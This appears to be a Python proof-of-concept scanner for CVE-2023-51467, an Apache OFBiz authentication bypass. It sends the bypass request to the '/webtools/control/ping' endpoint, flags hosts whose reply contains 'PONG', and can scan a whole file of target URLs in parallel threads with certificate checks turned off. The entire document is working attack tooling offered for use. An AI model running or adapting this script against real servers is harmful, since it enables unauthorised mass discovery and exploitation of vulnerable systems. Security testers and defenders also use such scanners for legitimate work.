#!/bin/python3

import argparse
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from alive_progress import alive_bar
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
color = Console()

def ascii_art():
    color.print("[red]  _______      ________    ___   ___ ___  ____        _____ __ _  _     ________[/red]")
    color.print("[red] / ____\ \    / /  ____|  |__ \ / _ \__ \|___ \      | ____/_ | || |   / /____  |[/red]")
    color.print("[red]| |     \ \  / /| |__ ______ ) | | | | ) | __) |_____| |__  | | || |_ / /_   / /[/red]")
    color.print("[red]| |      \ \/ / |  __|______/ /| | | |/ / |__ <______|___ \ | |__   _|  _ \ / /[/red]")
    color.print("[red]| |____   \  /  | |____    / /_| |_| / /_ ___) |      ___) || |  | | | (_) / /[/red]")
    color.print("[red] \_____|   \/   |______|  |____|\___/____|____/      |____/ |_|  |_|  \___/_/[/red]")
    print("")
    print("Coded By: Subha_Sardar")
    print("")

def detect_CVE_2023_51467(target):
    vulnerable = "PONG"
    vuln_path = '/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y'
    try:
        send_get = requests.get(target + vuln_path, timeout=5, verify=False)
        if send_get.status_code == 200 and vulnerable in send_get.text:
            color.print(f"[green][+][/green] [cyan]{target}{vuln_path}[/cyan] - is vulnerable to [green]CVE-2023-51467[/green]")
    except Exception:
        pass

def scan_from_file(target_file, threads):
    try:
        with open(target_file, 'r') as url_file:
            urls = [url.strip() for url in url_file]
            if not urls:
                color.print("[red][ERROR][/red] No targets found in the file.")
                return

            start_time = time.time()
            completed_tasks = []
            failed_tasks = []

            executor = ThreadPoolExecutor(max_workers=threads)
            with alive_bar(len(urls), title='Scanning Targets', bar='classic', enrich_print=False) as bar:
                future_to_url = {executor.submit(detect_CVE_2023_51467, target): target for target in urls}

                for future in as_completed(future_to_url):
                    target = future_to_url[future]
                    try:
                        future.result()
                        completed_tasks.append(target)
                    except Exception as e:
                        failed_tasks.append((target, e))
                    bar()

            executor.shutdown()
    except FileNotFoundError:
        color.print("[red][ERROR][/red] File not found.")

def main():
    ascii_art()
    parser = argparse.ArgumentParser(description='A PoC for CVE-2023-51467 - Apache OFBiz Authentication Bypass')
    parser.add_argument('-u', '--url', help='Target URL to scan')
    parser.add_argument('-f', '--file', help='File containing target URLs to scan')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads for scanning')
    args = parser.parse_args()

    if args.url:
        detect_CVE_2023_51467(args.url)
    elif args.file:
        scan_from_file(args.file, args.threads)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
